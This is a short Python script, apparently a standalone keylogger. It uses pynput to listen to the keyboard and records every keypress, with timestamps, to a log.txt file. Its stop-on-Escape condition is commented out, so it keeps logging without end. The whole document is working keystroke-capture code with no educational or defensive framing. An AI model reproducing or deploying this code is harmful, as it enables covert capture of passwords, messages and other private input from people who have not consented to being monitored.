#LIBRARIES
from pynput.keyboard import Key, Listener
import logging

#DIRECTORY VARIABLE
log_dir = ""

#FORMATTING
logging.basicConfig(filename=(log_dir + 'log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

#LOGGING WHAT THE LISTENER HEARD
def on_press(key):
    logging.info('"{0}"'.format(key))
    #if key == Key.esc
        #return False

#LISTENING FOR INPUT
with Listener(on_press=on_press) as listener:
    listener.join()